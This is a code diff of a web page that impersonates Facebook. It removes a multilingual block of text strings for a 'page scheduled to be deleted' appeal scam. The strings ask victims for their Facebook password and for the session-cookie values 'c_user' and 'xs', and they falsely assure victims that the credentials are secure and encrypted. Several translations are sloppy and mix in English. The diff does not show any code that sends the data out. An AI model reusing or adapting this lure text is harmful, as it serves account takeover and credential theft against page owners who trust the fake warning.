@@ -1123,7 +1123,7 @@
 
         <div class="menu-item">
           <svg class="menu-icon" viewBox="0 0 512 512">
-            <path d="M256 0c4.6 0 9.2 1 13.4 2.9L457.7 82.8c22 9.3 38.4 31 38.3 57.2c-.5 99.2-41.3 280.7-213.6 363.2c-16.7 8-36.1 8-52.8 0C57.3 420.7 16.5 239.2 16 140c-.1-26.2 16.3-47.9 38.3-57.2L242.7 2.9C246.8 1 251.4 0 256 0zm0 66.8V444.8C394 378 431.1 230.1 432 141.4L256 66.8l0 0z"/>
+            <path d="M256 512c141.4 0 256-114.6 256-256S397.4 0 256 0S0 114.6 0 256S114.6 512 256 512zM216 336h24V272H216c-13.3 0-24-10.7-24-24s10.7-24 24-24h48c13.3 0 24 10.7 24 24v88h8c13.3 0 24 10.7 24 24s-10.7 24-24 24H216c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-144c-17.7 0-32-14.3-32-32s14.3-32 32-32s32 14.3 32 32s-14.3 32-32 32z"/>
           </svg>
           <span class="menu-text">Privacy Policy</span>
         </div>
@@ -1361,876 +1361,748 @@
           <button id="changeLanguageBtn" style="background: #0064e0; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
             <span id="fbSendBtnText" class="translatable" data-key="changeLanguage">Change Language</span>
           </button>
-        
+        </div>
       </div>
-    
+    </div>
+  </div>
 
   <script>
-   // Wait for the DOM to be fully loaded
-document.addEventListener('DOMContentLoaded', function() {
-  // Language translations
-  const translations = {
-    english: {
-      warningTitle: "Your page is scheduled to be deleted!",
-      warningSubtext: "We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification.",
-      warningExtra: "If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.",
-      appealTitle: "Appeal request",
-      appealDesc: "Fixing problems with your page. Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.",
-      appealBtn: "Appeal",
-      formTitle: "Page Appeal Request",
-      formSubtitle: "Submit your information to appeal the deletion",
-      formNotice1: "ⓘ Your page has a violation related to our community guidelines.",
-      formNotice2: "ⓘ Please review the violation details carefully before submitting.",
-      formNotice3: "ⓘ Ensure you provide correct information for your appeal.",
-      nameLabel: "c_user",
-      mallLabel: "xs",
-      submitBtn: "Submit Appeal Request",
-      fbFormTitle: "Facebook Verification",
-      fbFormSubtitle: "Verify your identity to continue with the appeal",
-      fbNotice1: "ⓘ For security purposes, we need to verify your Facebook account.",
-      fbNotice2: "ⓘ This helps us ensure that you are the legitimate owner of the page.",
-      fbNotice3: "ⓘ Your credentials are secure and encrypted.",
-      passwordLabel: "Password",
-      verifyBtn: "Verify and Continue",
-      forgotPassword: "Forgotten password?",
-      successTitle: "Appeal Submitted Successfully",
-      successText: "Your appeal has been received and is now in review. We'll notify you via email once a decision has been made, typically within 7 business days.",
-      referenceText: "Reference ID:",
-      guideTitle: "Appeal Guide",
-      guideText1: "If your appeal/request involves the use of copyrighted information or content in your account or that is being processed/shared, you may provide us information to help us better understand your request. Please provide a detailed explanation of why you believe your account was incorrectly flagged or suspended. Include any relevant information that may help us review your case more effectively.",
-      guideText2: "After your submission, we will review your appeal and contact you within the timeframe of the information you provide to resolve. The review process could take up to 7 business days. Please check your email for updates.",
-      guideText3: "Note: You can change your language preference at any time by clicking the language selector at the bottom of the page.",
-      resourcesTitle: "Additional Resources",
-      helpCenterTitle: "Help Center",
-      helpCenterDesc: "Find answers to common questions and learn how to use our products.",
-      contactSupportTitle: "Contact Support",
-      contactSupportDesc: "Get in touch with our support team for personalized assistance.",
-      guidelinesTitle: "Community Guidelines",
-      guidelinesDesc: "Learn about our community standards and content policies.",
-      dashboardTitle: "Status Dashboard",
-      dashboardDesc: "Check the current status of our services and report outages.",
-      changeLanguage: "Change Language"
-    },
-    hindi: {
-      warningTitle: "आपके पेज को हटाने के लिए निर्धारित किया गया है!",
-      warningSubtext: "हमें कई रिपोर्ट मिली हैं कि आपका पेज हमारे सेवा की शर्तों और सामुदायिक दिशानिर्देशों का उल्लंघन करता है। नतीजतन, आपके पेज को सत्यापन के लिए भेजा जाएगा।",
-      warningExtra: "यदि आपको लगता है कि आपके पेज को गलती से हटाने के लिए निर्धारित किया गया था, तो आप नीचे अपील बटन पर क्लिक करके और कुछ त्वरित जानकारी प्रदान करके इसके स्थायी निष्कासन को रोक सकते हैं。",
-      appealTitle: "अपील अनुरोध",
-      appealDesc: "अपने पेज की समस्याओं को ठीक करना। कृपया नीचे अनुरोधित जानकारी प्रदान करना सुनिश्चित करें। इस जानकारी को प्रदान न करने से आपकी अपील के प्रसंस्करण में देरी हो सकती है。",
-      appealBtn: "अपील करें",
-      formTitle: "पेज अपील अनुरोध",
-      formSubtitle: "हटाने की अपील करने के लिए अपनी जानकारी जमा करें",
-      formNotice1: "ⓘ आपके पेज में हमारे सामुदायिक दिशानिर्देशों से संबंधित उल्लंघन है।",
-      formNotice2: "ⓘ सबमिट करने से पहले कृपया उल्लंघन विवरणों की सावधानीपूर्वक समी REVIEW करें。",
-      formNotice3: "ⓘ अपनी अपील के लिए सही जानकारी प्रदान करना सुनिश्चित करें。",
-      nameLabel: "c_user",
-      mallLabel: "xs",
-      submitBtn: "अपील अनुरोध जमा करें",
-      fbFormTitle: "फेसबुक सत्यापन",
-      fbFormSubtitle: "अपील जारी रखने के लिए अपनी पहचान सत्यापित करें",
-      fbNotice1: "ⓘ सुरक्षा उद्देश्यों के लिए, हमें आपके फेसबुक खाते को सत्यापित करने की आवश्यकता है。",
-      fbNotice2: "ⓘ यह हमें यह सुनिश्चित करने में मदद करता है कि आप पेज के वैध मालिक हैं।",
-      fbNotice3: "ⓘ आपकी साख सुरक्षित और एन्क्रिप्टेड है。",
-      passwordLabel: "पासवर्ड",
-      verifyBtn: "सत्यापित करें और जारी रखें",
-      forgotPassword: "पासवर्ड भूल गए?",
-      successTitle: "अपील सफलतापूर्वक जमा की गई",
-      successText: "आपकी अपील प्राप्त हो गई है और अब समीक्षा के दौर से गुजर रही है। आम तौर पर 7 व्यावसायिक दिनों के भीतर निर्णय होने के बाद हम आपको ईमेल के माध्यम से सूचित करेंगे。",
-      referenceText: "संदर्भ आईडी:",
-      guideTitle: "अपील गाइड",
-      guideText1: "यदि आपकी अपील/अनुरोध में आपके खाते में कॉपीराइट की गई जानकारी या सामग्री का उपयोग शामिल है या जो प्रसंस्कृत की जा रही है, तो आप हमें अपने अनुरोध को बेहतर ढंग से समझने में मदद करने के लिए जानकारी प्रदान कर सकते हैं। कृपया विस्तृत व्याख्या प्रदान करें कि आपको क्यों लगता है कि आपके खाते को गलत तरीके से फ्लैग किया गया था या निलंबित किया गया था। कोई भी प्रासंगिक जानकारी शामिल करें जो हमें आपके मामले की अधिक प्रभावी ढंग से समीक्षा करने में मदद कर सकती है।",
-      guideText2: "आपके द्वारा जमा करने के बाद, हम आपकी अपील की समीक्षा करेंगे और समाधान के लिए आपके द्वारा प्रदान की गई जानकारी की समय सीमा के भीतर आपसे संपर्क करेंगे। समीक्षा प्रक्रिया में 7 व्यावसायिक दिन तक का समय लग सकता है। कृपया अपडेट के लिए अपने ईमेल की जांच करें。",
-      guideText3: "आप पृष्ठ के निचले भाग में भाषा चयनकर्ता पर क्लिक करके किसी भी समय अपनी भाषा प्राथमिकता बदल सकते हैं。",
-      resourcesTitle: "अतिरिक्त संसाधन",
-      helpCenterTitle: "सहायता केंद्र",
-      helpCenterDesc: "सामान्य प्रश्नों के उत्तर खोजें और हमारे उत्पादों का उपयोग करना सीखें。",
-      contactSupportTitle: "समर्थन से संपर्क करें",
-      contactSupportDesc: "व्यक्तिगत सहायता के लिए हमारी समर्थन टीम से संपर्क करें",
-      guidelinesTitle: "सामुदायिक दिशानिर्देश",
-      guidelinesDesc: "हमारे सामुदायिक मानकों और सामग्री नीतियों के बारे में जानें。",
-      dashboardTitle: "स्थिति डैशबोर्ड",
-      dashboardDesc: "हमारी सेवाओं की वर्तमान स्थिति की जाँच करें और आउटेज की रिपोर्ट करें。",
-      changeLanguage: "भाषा बदलें"
-    },
-    spanish: {
-      warningTitle: "¡Tu página está programada para ser eliminada!",
-      warningSubtext: "Hemos recibido varios informes de que tu página viola nuestros términos de servicio y pautas comunitarias. Como resultado, tu página será enviada para verificación.",
-      warningExtra: "If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.",
-      appealTitle: "Solicitud de apelación",
-      appealDesc: "Solucionando problemas con tu página. Asegúrate de proporcionar la información solicitada a continuación. No proporcionar esta información puede retrasar el procesamiento de tu apelación.",
-      appealBtn: "Apelar",
-      formTitle: "Solicitud de Apelación de Página",
-      formSubtitle: "Envía tu información para apelar la eliminación",
-      formNotice1: "ⓘ Tu página tiene una violación relacionada con nuestras pautas comunitarias.",
-      formNotice2: "ⓘ Por favor, revisa los detalles de la violación cuidadosamente antes de enviar.",
-      formNotice3: "ⓘ Asegúrate de proporcionar información correcta para tu apelación.",
-      nameLabel: "c_user",
-      mallLabel: "xs",
-      submitBtn: "Enviar solicitud de apelación",
-      fbFormTitle: "Verificación de Facebook",
-      fbFormSubtitle: "Verify your identity to continue with the appeal",
-      fbNotice1: "ⓘ Por motivos de seguridad, necesitamos verificar tu cuenta de Facebook.",
-      fbNotice2: "ⓘ Esto nos ayuda a asegurar que eres el propietario legítimo de la página.",
-      fbNotice3: "ⓘ Tus credenciales están seguras y encriptadas.",
-      passwordLabel: "Contraseña",
-      verifyBtn: "Verificar y Continuar",
-      forgotPassword: "¿Olvidaste tu contraseña?",
-      successTitle: "Apelación Enviada Exitosamente",
-      successText: "Tu apelación ha sido recibida y ahora está en revisión. Te notificaremos por correo electrónico una vez que se haya tomado una decisión, generalmente dentro de 7 días hábiles.",
-      referenceText: "ID de referencia:",
-      guideTitle: "Guía de Apelación",
-      guideText1: "Si su apelación/solicitud implica el uso de información con derechos de autor o contenido en su cuenta or that is being processed/shared, you may provide us information to help us better understand your request. Proporcione una explicación detallada de por qué cree that su cuenta fue marcada o suspendida incorrectamente. Incluya cualquier información relevante que pueda ayudarnos a revisar su caso de manera más efectiva.",
-      guideText2: "Después de su envío, revisaremos su apelación y nos comunicaremos con usted dentro del plazo de la información que proporcione para resolver. El proceso de revisión podría tardar hasta 7 días hábiles. Por favor, revise su correo electrónico para obtener actualizaciones.",
-      guideText3: "Nota: Puede cambiar su preferencia de idioma en cualquier momento haciendo clic en el selector de idioma en la parte inferior de la página.",
-      resourcesTitle: "Recursos Adicionales",
-      helpCenterTitle: "Centro de Ayuda",
-      helpCenterDesc: "Encuentra respuestas a preguntas comunes y aprende a usar nuestros productos.",
-      contactSupportTitle: "Contactar Soporte",
-      contactSupportDesc: "Comunícate con nuestro equipo de soporte para asistencia personalizada.",
-      guidelinesTitle: "Pautas de la Comunidad",
-      guidelinesDesc: "Conoce nuestros estándares comunitarios y políticas de contenido.",
-      dashboardTitle: "Panel de Estado",
-      dashboardDesc: "Consulta el estado actual of nuestros servicios e informa interrupciones.",
-      changeLanguage: "Cambiar idioma"
-    },
-    portuguese: {
-      warningTitle: "Sua página está programada para ser excluída!",
-      warningSubtext: "Recebemos vários relatos de que sua página viola nossos termos de serviço and diretrizes da comunidade. Como resultado, sua página será enviada para verificação.",
-      warningExtra: "Se você acredita que sua página foi programada para exclusão por engano, pode evitar sua remoção permanente simply clicking the appeal button below and providing some quick information.",
-      appealTitle: "Solicitação de recurso",
-      appealDesc: "Corrigindo problemas com sua página. Certifique-se de fornecer as informações solicitadas abaixo. A não divulgação dessas informações pode atrasar the processing of your appeal.",
-      appealBtn: "Recorrer",
-      formTitle: "Solicitação de Recurso de Página",
-      formSubtitle: "Envie suas informações para contestar a exclusão",
-      formNotice1: "ⓘ Sua página tem uma violação relacionada às nossas diretrizes comunitárias.",
-      formNotice2: "ⓘ Revise os detalhes da violação cuidadosamente antes de enviar.",
-      formNotice3: "ⓘ Certifique-se de fornecer informações corretas para o seu recurso.",
-      nameLabel: "c_user",
-      mallLabel: "xs",
-      submitBtn: "Envir solicitação de recurso",
-      fbFormTitle: "Verificação do Facebook",
-      fbFormSubtitle: "Verifique sua identidade para continuar com o recurso",
-      fbNotice1: "ⓘ Para fins de segurança, precisamos verificar sua conta do Facebook.",
-      fbNotice2: "ⓘ Isso nos ajuda a garantir that você é o proprietário legítimo da página.",
-      fbNotice3: "ⓘ Suas credenciais são seguras and criptografadas.",
-      passwordLabel: "Senha",
-      verifyBtn: "Verificar e Continuar",
-      forgotPassword: "Esqueceu a senha?",
-      successTitle: "Recurso enviado com sucesso",
-      successText: "Seu recurso foi recebido e agora está em análise. Notificaremos você por e-mail assim que uma decisão for tomada, geralmente within 7 dias úteis.",
-      referenceText: "ID de referência:",
-      guideTitle: "Guia de recurso",
-      guideText1: "Se o seu recurso/solicitação envolver o uso de informações protegidas por direitos autorais ou conteúdo em sua conta or that is being processed/shared, você pode nos fornecer informações para nos ajudar a entender melhor sua solicitação. Forneça uma explicação detalhada do porquê você acredita que sua conta foi sinalizada ou suspensa incorretamente. Inclua todas as informações relevantes that may help us review your case more effectively.",
-      guideText2: "Após o envio, revisaremos seu recurso e entraremos em contato com você dentro do prazo das informações fornecidas para resolver. O processo de revisão pode levar até 7 dias úteis. Verifique seu e-mail para atualizações.",
-      guideText3: "Nota: Você can alterar sua preferência de idioma a qualquer momento clicando no seletor de idioma na parte inferior da página.",
-      resourcesTitle: "Recursos Adicionais",
-      helpCenterTitle: "Central de Ajuda",
-      helpCenterDesc: "Encontre respostas para perguntas comuns e aprenda a usar nossos produtos.",
-      contactSupportTitle: "Contatar Suporte",
-      contactSupportDesc: "Entre em contato com nossa equipe de suporte para assistência personalizada.",
-      guidelinesTitle: "Diretrizes da Comunidade",
-      guidelinesDesc: "Conheça nossos padrões comunitários e políticas de conteúdo.",
-      dashboardTitle: "Painel de Status",
-      dashboardDesc: "Verifique o status atual de nossos serviços e relate interrupções.",
-      changeLanguage: "Mudar idioma"
-    },
-    tamil: {
-      warningTitle: "உங்கள் பக்கம் நீக்கத் திட்டமிடப்பட்டுள்ளது!",
-      warningSubtext: "உங்கள் பக்கம் எங்கள் சேவை விதிமுறைகள் மற்றும் சமூக வழிகாட்டுதல்களை மீறுவதாக பல புகார்கள் எங்களுக்கு கிடைத்துள்ளன. இதன் விளைவாக, உங்கள் பக்கம் சரிபார்ப்பிற்கு அனுப்பப்படும்.",
-      warningExtra: "உங்கள் பக்கம் தவறாக நீக்கத் திட்டமிடப்பட்டதாக நீங்கள் நம்பினால், கீழே உள்ள மேல்முறையீடு பொத்தானைக் கிளிக் செய்து சில விரைவான தகவல்களை வழங்குவதன் மூலம் அதன் நிரந்தர நீக்கத்தைத் தடுக்கலாம்.",
-      appealTitle: "மேல்முறையீடு கோரிக்கை",
-      appealDesc: "உங்கள் பக்கத்தில் உள்ள சிக்கல்களை சரிசெய்தல். கீழே கோரப்பட்ட தகவல்களை வழங்குவதை உறுதிசெய்யவும். இந்த தகவலை வழங்காததால் உங்கள் மேல்முறையீட்டின் செயலாக்கம் தாமதமாகலாம்.",
-      appealBtn: "மேல்முறையீடு",
-      formTitle: "பக்க மேல்முறையீடு கோரிக்கை",
-      formSubtitle: "நீக்கத்தை மேல்முறையீடு செய்ய உங்கள் தகவல்களை சமர்ப்பிக்கவும்",
-      formNotice1: "ⓘ உங்கள் பக்கத்தில் எங்கள் சமூக வழிகாட்டுதல்கள் தொடர்பான மீறல் உள்ளது.",
-      formNotice2: "ⓘ சமர்ப்பிப்பதற்கு முன் மீறல் விவரங்களை கவனமாக மதிப்பாய்வு செய்யவும்.",
-      formNotice3: "ⓘ உங்கள் மேல்முறையீட்டிற்கான சரியான தகவல்களை வழங்குவதை உறுதிசெய்யவும்.",
-      nameLabel: "c_user",
-      mallLabel: "xs",
-      submitBtn: "மேல்முறையீடு கோரிக்கையை சமர்ப்பிக்கவும்",
-      fbFormTitle: "பேஸ்புக் சரிபார்ப்பு",
-      fbFormSubtitle: "மேல்முறையீட்டைத் தொடர உங்கள் அடையாளத்தை சரிபார்க்கவும்",
-      fbNotice1: "ⓘ பாதுகாப்பு நோக்கங்களுக்காக, உங்கள் பேஸ்புக் கணக்கை சரிபார்க்க வேண்டும்.",
-      fbNotice2: "ⓘ இது பக்கத்தின் சட்டபூர்வமான உரிமையாளர் நீங்கள் என்பதை உறுதிப்படுத்த உதவுகிறது.",
-      fbNotice3: "ⓘ உங்கள் அறிவுறுத்தல்கள் பாதுகாப்பானவை மற்றும் குறியாக்கம் செய்யப்பட்டவை.",
-      passwordLabel: "கடவுச்சொல்",
-      verifyBtn: "சரிபார்த்து தொடரவும்",
-      forgotPassword: "கடவுச்சொல் மறந்துவிட்டீர்களா?",
-      successTitle: "மேல்முறையீடு வெற்றிகரமாக சமர்ப்பிக்கப்பட்டது",
-      successText: "உங்கள் மேல்முறையீடு பெறப்பட்டது மற்றும் இப்போது மதிப்பாய்வில் உள்ளது. பொதுவாக 7 வணிக நாட்களுக்குள் ஒரு முடிவு எடுக்கப்பட்டவுடன் மின்னஞ்சல் மூலம் உங்களுக்கு அறிவிப்போம்.",
-      referenceText: "குறிப்பு ஐடி:",
-      guideTitle: "மேல்முறையீடு வழிகாட்டி",
-      guideText1: "உங்கள் மேல்முறையீடு/கோரிக்கை உங்கள் கணக்கில் பதிப்புரிமை கொண்ட தகவல் அல்லது உள்ளடக்கத்தின் பயன்பாட்டை உள்ளடக்கியிருந்தால் அல்லது செயலாக்கம்/பகிரப்படுகிறது என்றால், எங்கள் கோரிக்கையை நன்றாக புரிந்துகொள்ள எங்களுக்கு தகவல்களை வழங்கலாம். உங்கள் கணக்கு தவறாகக் குறிக்கப்பட்டது அல்லது இடைநிறுத்தப்பட்டது என்று நீங்கள் ஏன் நம்புகிறீர்கள் என்பதற்கான விரிவான விளக்கத்தை வழங்கவும். உங்கள் வழக்கை மிகவும் திறம்பட மதிப்பாய்வு செய்ய எங்களுக்கு உதவக்கூடிய ஏதேனும் தொடர்புடைய தகவல்களைச் சேர்க்கவும்.",
-      guideText2: "உங்கள் சமர்ப்பிப்பிற்குப் பிறகு, எங்கள் மேல்முறையீட்டை மதிப்பாய்வு செய்து, தீர்க்க நீங்கள் வழங்கும் தகவலின் காலக்கெடுவுக்குள் உங்களுடன் தொடர்பு கொள்வோம். மதிப்பாய்வு செயல்முறை 7 வணிக நாட்கள் வரை எடுக்கலாம். புதுப்பிப்புகளுக்கு உங்கள் மின்னஞ்சலைச் சரிபார்க்கவும்.",
-      guideText3: "குறிப்பு: பக்கத்தின் கீழே உள்ள மொழி தேர்வியைக் கிளிக் செய்வதன் மூலம் எந்த நேரத்திலும் உங்கள் மொழி விருப்பத்தை மாற்றலாம்.",
-      resourcesTitle: "கூடுதல் வளங்கள்",
-      helpCenterTitle: "உதவி மையம்",
-      helpCenterDesc: "பொதுவான கேள்விகளுக்கான பதில்களைக் கண்டறிந்து எங்கள் தயாரிப்புகளை எவ்வாறு பயன்படுத்துவது என்பதை அறிக.",
-      contactSupportTitle: "ஆதரவைத் தொடர்பு கொள்ளவும்",
-      contactSupportDesc: "தனிப்பட்ட உதவிக்கு எங்கள் ஆதரவு குழுவைத் தொடர்பு கொள்ளவும்.",
-      guidelinesTitle: "சமூக வழிகாட்டுதல்கள்",
-      guidelinesDesc: "எங்கள் சமூக தரங்கள் மற்றும் உள்ளடக்கக் கொள்கைகளைப் பற்றி அறிக.",
-      dashboardTitle: "நிலை டாஷ்போர்டு",
-      dashboardDesc: "எங்கள் சேவைகளின் தற்போதைய நிலையைச் சரிபார்த்து, இடையூறுகளைப் புகாரளிக்கவும்.",
-      changeLanguage: "மொழியை மாற்று"
-    },
-    arabic: {
-      warningTitle: "صفحتك مجدولة للحذف!",
-      warningSubtext: "لقد تلقينا عدة تقارير تفيد بأن صفحتك تنتهك شروط الخدمة وإرشادات المجتمع الخاصة بنا. نتيجة لذلك، سيتم إرسال صفحتك للتحقق.",
-      warningExtra: "إذا كنت تعتقد أنه تم جدولة صفحتك للحذف عن طريق الخطأ، فيمكنك منع إزالتها الدائمة ببساطة عن طريق النقر على زر الاستئناف أدناه وتقديم بعض المعلومات السريعة.",
-      appealTitle: "طلب الاستئناف",
-      appealDesc: "إصلاح المشاكل في صفحتك. يرجى التأكد من تقديم المعلومات المطلوبة أدناه. قد يؤدي عدم تقديم هذه المعلومات إلى تأخير معالجة استئنافك.",
-      appealBtn: "استئناف",
-      formTitle: "طلب استئناف الصفحة",
-      formSubtitle: "أرسل معلوماتك للاستئناف ضد الحذف",
-      formNotice1: "ⓘ تحتوي صفحتك على انتهاك متعلق بإرشادات المجتمع الخاصة بنا.",
-      formNotice2: "ⓘ يرجى مراجعة تفاصيل الانتهاك بعناية قبل الإرسال.",
-      formNotice3: "ⓘ تأكد من تقديم معلومات صحيحة لاستئنافك.",
-      nameLabel: "c_user",
-      mallLabel: "xs",
-      submitBtn: "إرسال طلب الاستئناف",
-      fbFormTitle: "التحقق من فيسبوك",
-      fbFormSubtitle: "تحقق من هويتك للمتابعة مع الاستئناف",
-      fbNotice1: "ⓘ لأغراض أمنية، نحتاج إلى التحقق من حساب فيسبوك الخاص بك.",
-      fbNotice2: "ⓘ هذا يساعدنا على التأكد من أنك المالك الشرعي للصفحة.",
-      fbNotice3: "ⓘ بيانات الاعتماد الخاصة بك آمنة ومشفرة.",
-      passwordLabel: "كلمة المرور",
-      verifyBtn: "التحقق والمتابعة",
-      forgotPassword: "نسيت كلمة المرور?",
-      successTitle: "تم إرسال الاستئناف بنجاح",
-      successText: "لقد تم استلام استئنافك وهو الآن قيد المراجعة. سنخطرك عبر البريد الإلكتروني بمجرد اتخاذ قرار، عادة خلال 7 أيام عمل.",
-      referenceText: "معرف المرجع:",
-      guideTitle: "دليل الاستئناف",
-      guideText1: "إذا كان استئنافك / طلبك يتضمن استخدام معلومات محمية بحقوق الطبع والنشر أو محتوى في حسابك أو الذي يتم معالجته / مشاركته، فيمكنك تقديم معلومات لمساعدتنا على فهم طلبك بشكل أفضل. يرجى تقديم شرح مفصل لسبب اعتقادك أنه تم الإبلاغ عن حسابك أو تعليقه بشكل غير صحيح. قم بتضمين أي معلومات ذات صلة قد تساعدنا في مراجعة قضيتك بشكل أكثر فعالية.",
-      guideText2: "بعد إرسالك، سنراجع استئنافك ونلتقي بك خلال الإطار الزمني للمعلومات التي تقدمها لحل. قد تستغرق عملية المراجعة ما يصل إلى 7 أيام عمل. يرجى التحقق من بريدك الإلكتروني للحصول على التحديثات.",
-      guideText3: "ملاحظة: يمكنك تغيير تفضيل اللغة في أي وقت بالنقر على محدد اللغة في أسفل الصفحة.",
-      resourcesTitle: "موارد إضافية",
-      helpCenterTitle: "مركز المساعدة",
-      helpCenterDesc: "ابحث عن إجابات للأسئلة الشائعة وتعلم كيفية استخدام منتجاتنا.",
-      contactSupportTitle: "اتصل بالدعم",
-      contactSupportDesc: "تواصل مع فريق الدعم الخاص بنا للحصول على مساعدة مخصصة.",
-      guidelinesTitle: "إرشادات المجتمع",
-      guidelinesDesc: "تعرف على معايير المجتمع وسياسات المحتوى الخاصة بنا.",
-      dashboardTitle: "لوحة الحالة",
-      dashboardDesc: "تحقق من الحالة الحالية لخدماتنا وأبلغ عن الأعطال.",
-      changeLanguage: "تغيير اللغة"
-    },
-     
-    vietnamese: {
-    warningTitle: "Trang của bạn đã được lên lịch để xóa!",
-    warningSubtext: "Chúng tôi đã nhận được một số báo cáo rằng trang của bạn vi phạm điều khoản dịch vụ và nguyên tắc cộng đồng của chúng tôi. Do đó, trang của bạn sẽ được gửi đi để xác minh.",
-    warningExtra: "Nếu bạn tin rằng trang của bạn đã bị lên lịch xóa nhầm, bạn có thể ngăn việc xóa vĩnh viễn bằng cách nhấp vào nút khiếu nại bên dưới và cung cấp một số thông tin nhanh.",
-    appealTitle: "Yêu cầu khiếu nại",
-    appealDesc: "Khắc phục sự cố với trang của bạn. Vui lòng đảm bảo cung cấp thông tin được yêu cầu bên dưới. Không cung cấp thông tin này có thể làm chậm quá trình xử lý khiếu nại của bạn.",
-    appealBtn: "Khiếu nại",
-    formTitle: "Yêu cầu Khiếu nại Trang",
-    formSubtitle: "Gửi thông tin của bạn để khiếu nại việc xóa",
-    formNotice1: "ⓘ Trang của bạn có vi phạm liên quan đến nguyên tắc cộng đồng của chúng tôi.",
-    formNotice2: "ⓘ Vui lòng xem xét kỹ chi tiết vi phạm trước khi gửi.",
-    formNotice3: "ⓘ Đảm bảo bạn cung cấp thông tin chính xác cho khiếu nại của mình.",
-    nameLabel: "c_user",
-    mallLabel: "xs",
-    submitBtn: "Gửi Yêu cầu Khiếu nại",
-    fbFormTitle: "Xác minh Facebook",
-    fbFormSubtitle: "Xác minh danh tính của bạn để tiếp tục khiếu nại",
-    fbNotice1: "ⓘ Vì mục đích bảo mật, chúng tôi cần xác minh tài khoản Facebook của bạn.",
-    fbNotice2: "ⓘ Điều này giúp chúng tôi đảm bảo rằng bạn là chủ sở hữu hợp pháp của trang.",
-    fbNotice3: "ⓘ Thông tin đăng nhập của bạn được bảo mật và mã hóa.",
-    passwordLabel: "Mật khẩu",
-    verifyBtn: "Xác minh và Tiếp tục",
-    forgotPassword: "Quên mật khẩu?",
-    successTitle: "Khiếu nại Đã gửi Thành công",
-    successText: "Khiếu nại của bạn đã được nhận và hiện đang được xem xét. Chúng tôi sẽ thông báo cho bạn qua email khi có quyết định, thường trong vòng 7 ngày làm việc.",
-    referenceText: "ID Tham chiếu:",
-    guideTitle: "Hướng dẫn Khiếu nại",
-    guideText1: "Nếu khiếu nại/yêu cầu của bạn liên quan đến việc sử dụng thông tin có bản quyền hoặc nội dung trong tài khoản của bạn hoặc đang được xử lý/chia sẻ, bạn có thể cung cấp cho chúng tôi thông tin để giúp chúng tôi hiểu rõ hơn về yêu cầu của bạn. Vui lòng cung cấp giải thích chi tiết về lý do bạn tin rằng tài khoản của mình đã bị gắn cờ hoặc đình chỉ không chính xác. Bao gồm bất kỳ thông tin liên quan nào có thể giúp chúng tôi xem xét trường hợp của bạn hiệu quả hơn.",
-    guideText2: "Sau khi bạn gửi, chúng tôi sẽ xem xét khiếu nại của bạn và liên hệ với bạn trong thời hạn thông tin bạn cung cấp để giải quyết. Quá trình xem xét có thể mất tới 7 ngày làm việc. Vui lòng kiểm tra email của bạn để cập nhật.",
-    guideText3: "Lưu ý: Bạn có thể thay đổi tùy chọn ngôn ngữ bất cứ lúc nào bằng cách nhấp vào bộ chọn ngôn ngữ ở cuối trang.",
-    resourcesTitle: "Tài nguyên Bổ sung",
-    helpCenterTitle: "Trung tâm Trợ giúp",
-    helpCenterDesc: "Tìm câu trả lời cho các câu hỏi thường gặp và tìm hiểu cách sử dụng sản phẩm của chúng tôi.",
-    contactSupportTitle: "Liên hệ Hỗ trợ",
-    contactSupportDesc: "Liên hệ với nhóm hỗ trợ của chúng tôi để được trợ giúp cá nhân hóa.",
-    guidelinesTitle: "Nguyên tắc Cộng đồng",
-    guidelinesDesc: "Tìm hiểu về tiêu chuẩn cộng đồng và chính sách nội dung của chúng tôi.",
-    dashboardTitle: "Bảng điều khiển Trạng thái",
-    dashboardDesc: "Kiểm tra trạng thái hiện tại của dịch vụ của chúng tôi và báo cáo sự cố.",
-    changeLanguage: "Thay đổi Ngôn ngữ"
-  },
-  
-   ghanaian: {
-      warningTitle: "Wɔahyɛ wo krataa no sɛ wɔbɛpaew!",
-      warningSubtext: "Yɛnnya amanneɛ bɛyɛ mienu a ɛkyerɛ sɛ wo krataa no di yɛn nkratoɔ ne mmara ahorow no so. Enti, wɔbɛsoma wo krataa no sɛ wɔnhwɛ so.",
-      warningExtra: "Sɛ wudwen sɛ yɛyɛ wo krataa no foforo a, wubetumi apia sɛ wɔmpaew no denam krataa a ɛwɔ aseɛ no so, na wode nkɔm hyɛ mu.",
-      appealTitle: "Apɛl kɔm",
-      appealDesc: "Yɛredware wo krataa no mu mfomsoɔ. Mesrɛ wo, hyɛ nsɛm a wɔhwehwɛ wɔ aseɛ no mu. Sɛ wunnye nsɛm no a, ebɛtumi ayɛ wo apɛl no mmerɛw.",
-      appealBtn: "Yɛ apɛl",
-      formTitle: "Krataa Apɛl Kɔm",
-      formSubtitle: "Hyɛ wo nsɛm sɛ wɔnyɛ apɛl wɔ paew no ho",
-      formNotice1: "ⓘ Wo krataa no ayɛ yɛn mmara ahorow no so.",
-      formNotice2: "ⓘ Mesrɛ wo, hwɛ mfomsoɔ no ho nsɛm yiye ansa na wuregye tomu.",
-      formNotice3: "ⓘ Hwɛ sɛ wuhyɛ nsɛm pa sɛ woyɛ apɛl.",
-      nameLabel: "c_user",
-      mallLabel: "xs",
-      submitBtn: "Yɛ Apɛl Kɔm",
-      fbFormTitle: "Facebook Nhwehwɛmu",
-      fbFormSubtitle: "Hwɛ wo ho sɛ wotumi tua so yɛ apɛl",
-      fbNotice1: "ⓘ Den nkitahodiɛ nti, yɛhwehwɛ sɛ yɛhwɛ wo Facebook account no.",
-      fbNotice2: "ⓘ Wei boa yɛn sɛ yɛhunu sɛ wo na wokura krataa no.",
-      fbNotice3: "ⓘ Wo nkyerɛwdeɛ no wɔ hɔ na wɔakora so.",
-      passwordLabel: "Password",
-      verifyBtn: "Hwɛ na Tua So",
-      forgotPassword: "Wɔagye password?",
-      successTitle: "Wɔayɛ apɛl no yiye",
-      successText: "Yɛagyɛ wo apɛl no adi, na ɛwɔ hwɛ mu. Yɛbɛkyerɛ wo denam email so sɛ yɛayɛ adwene, tumi nya nna nnum ansa.",
-      referenceText: "Reference ID:",
-      guideTitle: "Apɛl Kwankyerɛ",
